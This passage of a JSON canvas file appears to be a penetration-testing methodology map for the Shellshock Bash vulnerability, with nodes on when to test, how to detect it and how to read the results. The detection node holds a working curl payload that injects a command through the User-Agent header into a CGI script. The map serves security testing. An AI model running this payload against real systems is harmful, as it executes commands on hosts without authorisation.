      "x": 4750,
      "y": 39244,
      "width": 350,
      "height": 250,
      "text": "## Test Shellshock only through a confirmed CGI-to-Bash chain\n\nA real CGI endpoint invokes Bash and component/patch evidence supports the vulnerable family",
      "color": "5"
    },
    {
      "id": "method:web-shellshock:discover",
      "type": "text",
      "x": 5250,
      "y": 39204,
      "width": 780,
      "height": 180,
      "text": "### Discover\n\n```text\ncurl -i -H 'User-Agent: () { :;}; echo; /usr/bin/id' http://TARGET:PORT/cgi-bin/SCRIPT\n```"
    },
    {
      "id": "method:web-shellshock:interpret",
      "type": "text",
      "x": 6180,
      "y": 39184,
      "width": 580,
      "height": 156,
      "text": "### What the output establishes\n\nCommand-derived identity output supports Shellshock execution under the CGI process.",
      "color": "6"
    },
    {
      "id": "method:web-shellshock:validate",
      "type": "text",
      "x": 6180,
      "y": 39430,
      "width": 580,
